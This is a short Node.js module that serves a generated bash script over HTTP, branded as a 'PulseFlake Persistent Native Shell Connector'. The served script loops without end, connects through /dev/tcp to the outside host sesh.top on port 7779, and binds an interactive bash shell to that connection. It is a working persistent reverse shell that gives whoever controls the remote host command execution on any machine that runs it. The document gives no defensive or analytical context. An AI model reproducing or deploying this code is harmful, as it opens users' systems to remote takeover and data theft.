const http = require('http');

function serveBashScript(port = 7777) {
    const server = http.createServer((req, res) => {
        const url = req.url || '/';
        const match = url.match(/^\/?([\w.-]+)?$/);
        let defaultWorkspace = '';
        if (match && match[1]) {
            defaultWorkspace = match[1];
        }
        
        if (req.method === 'GET' && (url === '/' || defaultWorkspace)) {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            let script = '#!/bin/bash\n';
            script += '# PulseFlake Persistent Native Shell Connector\n';
            
            if (defaultWorkspace) {
                script += 'WORKSPACE="' + defaultWorkspace + '"\n';
            } else {
                script += 'if [ -z "$1" ]; then read -p "Workspace Name: " WORKSPACE; else WORKSPACE="$1"; fi\n';
            }
            
            script += 'if [ -z "$WORKSPACE" ]; then echo "Error: Workspace name required"; exit 1; fi\n';
            
            script += 'while true; do\n';
            script += '    (\n';
            script += '        # Open TCP connection on FD 3\n';
            script += '        if exec 3<>/dev/tcp/sesh.top/7779 2>/dev/null; then\n';
            script += '            echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] PulseFlake: ✅ Connected!"\n';
            script += '            echo "$WORKSPACE" >&3\n';
            script += '            # Using native bash for interactive session\n';
            script += '            /bin/bash -i <&3 >&3 2>&3 & PID=$!\n';
            script += '            wait $PID\n';
            script += '            exec 3>&-\n';
            script += '            echo -e "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] PulseFlake: ❌ Connection closed."\n';
            script += '        fi\n';
            script += '    )\n';
            script += '    sleep 1\n';
            script += 'done\n';
            
            res.end(script);
        } else {
            res.writeHead(404);
            res.end();
        }
    });

    server.listen(port, () => {
        console.log(`[Device] Bash Script Server listening on port ${port}`);
    });
}

module.exports = serveBashScript;
